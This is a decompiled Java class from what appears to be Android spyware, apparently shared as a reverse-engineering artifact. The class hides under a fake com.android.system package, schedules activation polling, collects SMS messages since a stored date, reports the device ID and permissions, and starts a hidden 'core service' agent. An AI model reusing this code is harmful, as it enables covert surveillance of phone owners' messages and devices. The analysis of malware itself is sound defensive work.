package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.SystemClock;
import com.app.system.common.a.f;
import com.app.system.common.h;
import com.app.system.common.service.EventsAndReceiveService;
import java.util.Date;

public class ActivationReceiver
  extends BroadcastReceiver
{
  public static void a(Context paramContext)
  {
    a(paramContext, e(paramContext), 60);
  }
  
  private static void a(Context paramContext, Intent paramIntent, int paramInt)
  {
    com.security.d.a.d("ActivationReceiver", "scheduleAlarms", new Object[0]);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + paramInt * 1000, PendingIntent.getBroadcast(paramContext, 0, paramIntent, 0));
  }
  
  public static void b(Context paramContext)
  {
    long l = paramContext.getSharedPreferences("pref", 0).getLong("last-sms-date", 0L);
    if (l <= 0L) {
      l = new Date().getTime() / 1000L - 86400L;
    }
    new f(paramContext).a(false, new Date((l + 1L) * 1000L), new Date());
  }
  
  public static void c(Context paramContext)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        com.security.a.a().a(h.c(this.a));
        com.security.a.a().b("<ID:".concat(h.c(this.a)).concat(">"));
        com.security.a.a().b("<PERM:".concat(h.c(this.a)).concat(">"));
      }
    }).start();
  }
  
  private static Intent d(Context paramContext)
  {
    paramContext = new Intent(paramContext, ActivationReceiver.class);
    paramContext.putExtra("param", "sms");
    return paramContext;
  }
  
  private static Intent e(Context paramContext)
  {
    paramContext = new Intent(paramContext, ActivationReceiver.class);
    paramContext.putExtra("param", "act");
    return paramContext;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("ActivationReceiver", "onReceive", new Object[0]);
    if (paramContext.getSharedPreferences("pref", 0).getBoolean("agent-active", false))
    {
      com.security.d.a.d("ActivationReceiver", "AGENT ATTIVO -- FERMO POLLING", new Object[0]);
      if (!h.e(paramContext))
      {
        com.security.d.a.d("ActivationReceiver", "AGENT ATTIVATO -- AVVIO CORE SERVICE", new Object[0]);
        Intent localIntent = new Intent(paramContext, CoreService.class);
        paramIntent.setFlags(268435456);
        paramContext.startService(localIntent);
      }
      return;
    }
    paramIntent = paramIntent.getStringExtra("param");
    if (paramIntent.equals("sms"))
    {
      paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
      paramIntent.putExtra("event_core_app", "event_poll_activation_sms");
      com.b.a.a.a.a(paramContext, paramIntent);
      a(paramContext, d(paramContext), 300);
    }
    else if (paramIntent.equals("act"))
    {
      paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
      paramIntent.putExtra("event_core_app", "event_poll_activation");
      com.b.a.a.a.a(paramContext, paramIntent);
      a(paramContext, e(paramContext), 300);
    }
  }
}


/* Location:              ~/com/android/system/ActivationReceiver.class
 *
 * Reversed by:           J
 */